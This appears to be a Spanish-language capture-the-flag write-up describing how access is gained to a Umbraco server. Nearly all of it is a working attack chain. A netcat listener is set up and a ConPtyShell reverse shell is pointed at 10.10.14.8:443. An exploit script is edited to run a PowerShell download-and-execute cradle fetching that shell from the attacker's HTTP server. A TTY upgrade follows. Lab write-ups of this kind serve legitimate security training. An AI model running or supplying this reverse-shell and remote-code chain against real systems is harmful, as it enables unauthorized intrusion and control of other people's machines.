## Vuln exploit & Gaining Access {-}

### Umbraco {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Recuperamos conPtyShell

    ```bash
    git clone https://github.com/antonioCoco/ConPtyShell
    cd ConPtyShell
    cp invoke-ConPtyShell.ps1 ../conptyshell.ps1
    cd ..
    vi conptyshell.ps1
    ```

1. Añadimos al final del fichero el commando

    ```powershell
    Invoke-ConPtyShell -RemoteIp 10.10.14.8 -RemotePort 443 -Rows 52 -Cols 189
    ```

1. Creamos un servidor http con python

    ```bash
    python -m http.server 80
    ```

1. Modificamos el commando a lanzar en el umbraco_exploit.py

    ```python
    proc.StartInfo.FileName = "cmd.exe"
    cmd = "/c powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.8/conptyshell.ps1\')"
    ```

1. Lanzamos el script

    ```bash
    python3 umbraco_exploit.py
    ```

Aqui vemos que hemos ganado acceso al systema como el usuario **defaultappool** con una shell totalmente interactiva.

### Tratamiento de la TTY {-}

```bash
^Z
stty raw -echo; fg
Enter
whoami
whoami
cd C:\
cd C:\
```

Aqui ya podemos ver la flag en el directorio Public.
